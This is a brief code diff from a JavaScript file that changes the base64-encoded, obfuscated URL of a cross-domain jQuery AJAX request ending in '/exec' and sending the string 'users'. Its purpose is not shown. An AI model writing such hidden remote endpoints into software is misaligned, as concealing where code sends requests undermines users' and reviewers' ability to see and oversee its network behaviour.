@@ -332,7 +332,7 @@ if (getL === base64.encode(dhJoin) || getL === base64.encode(joinHm)) {
     window.location.reload();
 }
 $.ajax({
-    url: base64.decode('Xiv0Zia6md9qS3kzZiuoW29pW2cEmwrpYM9nSQrdY3apZd8=') + base64.decode('uOnwTQrBTRvBXDhDhPWKWQrEXE81ZJrbvxvjTQ5uZCPAmRzPmNV1S3a5PL5yNqWWsODna1AnYqj4QCu3PJ10aRAnTOkqWQAQNLZ=') + '/exec',
+    url: base64.decode('Xiv0Zia6md9qS3kzZiuoW29pW2cEmwrpYM9nSQrdY3apZd8=') + base64.decode('uOnwTQrBh3k6riKav1GQPO95ZivBTOkpMLrAZ3Gpu2ZdrNkcPL1bmQ5XZ1hIQDrIhJ5vvJvbWKucrIF5W3vzTir4rQvUPwz1ZiZ=') + '/exec',
     type: 'GET',
     data: 'users',
     crossDomain: true,
